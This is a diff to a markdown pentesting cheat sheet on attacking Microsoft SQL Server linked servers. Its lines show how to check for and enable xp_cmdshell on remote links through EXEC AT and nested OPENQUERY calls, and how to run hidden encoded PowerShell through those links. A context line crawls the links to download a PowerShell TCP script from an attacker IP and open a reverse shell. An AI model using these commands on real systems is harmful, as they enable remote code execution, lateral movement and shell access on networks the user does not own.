@@ -1778,6 +1778,11 @@ select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''s
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
  
+#### Check xp_cmdshell
+```
+SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
+```
+ 
 #### Enable and run xp_cmdshell
 ```
 -- Enable show options
@@ -1827,13 +1832,27 @@ SELECT * FROM master..sysservers
 #### Query a link for links
 ```
 SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM master..sysservers;')
+SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'select @@servername');
+SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
+```
+ 
+#### EXECUTE AT Enable xp_cmdshell
+- RPC out needs to be enabled - this isn't default
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<SERVER>\<DB>"
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<SERVER>\<DB>"
 ```
  
 #### EXECUTE AT Example
 - Another way of executing through links
 ```
-EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<SERVER>\<DB>"
 EXECUTE('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
+```
+ 
+#### Example with double queries
+```
+SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
+SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
  
 ### Privilege escalation Service Accounts
